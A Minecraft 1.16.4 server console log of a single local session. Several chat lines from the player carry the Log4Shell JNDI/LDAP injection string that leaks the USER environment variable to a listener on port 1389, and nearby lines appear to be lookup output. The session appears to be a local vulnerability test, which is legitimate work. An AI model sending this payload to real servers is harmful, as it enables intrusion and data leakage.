[20:44:58] [main/INFO]: Environment: authHost='https://authserver.mojang.com', accountsHost='https://api.mojang.com', sessionHost='https://sessionserver.mojang.com', servicesHost='https://api.minecraftservices.com', name='PROD'
[20:44:59] [main/WARN]: Ambiguity between arguments [teleport, destination] and [teleport, targets] with inputs: [Player, 0123, @e, dd12be42-52a9-4a91-a8a1-11c01849e498]
[20:44:59] [main/WARN]: Ambiguity between arguments [teleport, location] and [teleport, destination] with inputs: [0.1 -0.5 .9, 0 0 0]
[20:44:59] [main/WARN]: Ambiguity between arguments [teleport, location] and [teleport, targets] with inputs: [0.1 -0.5 .9, 0 0 0]
[20:44:59] [main/WARN]: Ambiguity between arguments [teleport, targets] and [teleport, destination] with inputs: [Player, 0123, dd12be42-52a9-4a91-a8a1-11c01849e498]
[20:44:59] [main/WARN]: Ambiguity between arguments [teleport, targets, location] and [teleport, targets, destination] with inputs: [0.1 -0.5 .9, 0 0 0]
[20:44:59] [main/INFO]: Reloading ResourceManager: Default
[20:45:00] [Worker-Main-14/INFO]: Loaded 7 recipes
[20:45:00] [Worker-Main-14/INFO]: Loaded 927 advancements
[20:45:06] [Server thread/INFO]: Starting minecraft server version 1.16.4
[20:45:06] [Server thread/INFO]: Loading properties
[20:45:06] [Server thread/INFO]: Default game type: SURVIVAL
[20:45:06] [Server thread/INFO]: Generating keypair
[20:45:06] [Server thread/INFO]: Starting Minecraft server on *:25565
[20:45:06] [Server thread/INFO]: Using default channel type
[20:45:06] [Server thread/INFO]: Preparing level "world"
[20:45:07] [Server thread/INFO]: Preparing start region for dimension minecraft:overworld
[20:45:09] [Server thread/INFO]: Preparing spawn area: 0%
[20:45:09] [Server thread/INFO]: Preparing spawn area: 0%
[20:45:09] [Server thread/INFO]: Preparing spawn area: 0%
[20:45:09] [Server thread/INFO]: Preparing spawn area: 0%
[20:45:09] [Server thread/INFO]: Preparing spawn area: 0%
[20:45:09] [Server thread/INFO]: Preparing spawn area: 0%
[20:45:11] [Worker-Main-10/INFO]: Preparing spawn area: 83%
[20:45:11] [Worker-Main-11/INFO]: Preparing spawn area: 83%
[20:45:11] [Worker-Main-11/INFO]: Preparing spawn area: 83%
[20:45:11] [Worker-Main-11/INFO]: Preparing spawn area: 83%
[20:45:12] [Worker-Main-13/INFO]: Preparing spawn area: 87%
[20:45:12] [Worker-Main-10/INFO]: Preparing spawn area: 87%
[20:45:13] [Worker-Main-12/INFO]: Preparing spawn area: 95%
[20:45:13] [Server thread/INFO]: Time elapsed: 6198 ms
[20:45:13] [Server thread/INFO]: Done (6.363s)! For help, type "help"
[20:47:49] [User Authenticator #1/INFO]: UUID of player mosguinz is f2707dba-a28c-44b0-8abc-73203fbc2e58
[20:47:49] [Server thread/INFO]: mosguinz[/127.0.0.1:58804] logged in with entity id 199 at (77.5, 63.0, 82.5)
[20:47:49] [Server thread/INFO]: mosguinz joined the game
[20:48:30] [Server thread/INFO]: <mosguinz> Reference Class Name: foo

[20:55:37] [Server thread/INFO]: <mosguinz> Reference Class Name: foo

[20:58:44] [Server thread/INFO]: <mosguinz> asdf
[20:59:47] [Server thread/INFO]: <mosguinz> Reference Class Name: foo

[20:59:58] [Server thread/INFO]: <mosguinz> Reference Class Name: foo
ls
[21:03:36] [Server thread/INFO]: mosguinz was slain by Husk
[21:05:36] [Server thread/INFO]: Made mosguinz a server operator
[21:05:40] [Server thread/INFO]: mosguinz was slain by Husk
[21:05:46] [Server thread/INFO]: [mosguinz: Set own game mode to Creative Mode]
[21:06:09] [Server thread/INFO]: <mosguinz> ${jndi:ldap://${env:USER}.localhost:1389/a}ls
[21:06:27] [Server thread/INFO]: <mosguinz> ${jndi:ldap://${env:USER}.localhost:1389/a}
[21:06:34] [Server thread/INFO]: <mosguinz> Reference Class Name: foo

[21:06:43] [Server thread/INFO]: <mosguinz> Reference Class Name: foo

[21:06:56] [Server thread/INFO]: <mosguinz> ${jndi:ldap://${env:USER}.localhost:1389/a}
[21:09:32] [Server thread/INFO]: <mosguinz> Reference Class Name: foo

[21:25:26] [Server thread/INFO]: <mosguinz> Reference Class Name: foo

[21:27:51] [Server thread/INFO]: <mosguinz> Reference Class Name: foo

[21:29:27] [Server thread/INFO]: <mosguinz> Reference Class Name: foo

[21:31:28] [Server thread/INFO]: <mosguinz> ccc
[21:31:30] [Server thread/INFO]: <mosguinz> Reference Class Name: foo

[21:34:37] [Server thread/INFO]: <mosguinz> Reference Class Name: foo

[21:37:17] [Server thread/INFO]: <mosguinz> Reference Class Name: foo

[21:37:30] [Server thread/INFO]: <mosguinz> Reference Class Name: foo

[21:41:57] [Server thread/INFO]: mosguinz lost connection: Disconnected
[21:41:57] [Server thread/INFO]: mosguinz left the game
[21:42:02] [Server thread/INFO]: Stopping the server
[21:42:02] [Server thread/INFO]: Stopping server
[21:42:02] [Server thread/INFO]: Saving players
[21:42:02] [Server thread/INFO]: Saving worlds
[21:42:02] [Server thread/INFO]: Saving chunks for level 'ServerLevel[world]'/minecraft:overworld
[21:42:02] [Server thread/INFO]: ThreadedAnvilChunkStorage (world): All chunks are saved
[21:42:02] [Server thread/INFO]: Saving chunks for level 'ServerLevel[world]'/minecraft:the_nether
[21:42:02] [Server thread/INFO]: ThreadedAnvilChunkStorage (DIM-1): All chunks are saved
[21:42:02] [Server thread/INFO]: Saving chunks for level 'ServerLevel[world]'/minecraft:the_end
[21:42:02] [Server thread/INFO]: ThreadedAnvilChunkStorage (DIM1): All chunks are saved
[21:42:02] [Server thread/INFO]: ThreadedAnvilChunkStorage (world): All chunks are saved
[21:42:02] [Server thread/INFO]: ThreadedAnvilChunkStorage (DIM-1): All chunks are saved
[21:42:02] [Server thread/INFO]: ThreadedAnvilChunkStorage (DIM1): All chunks are saved
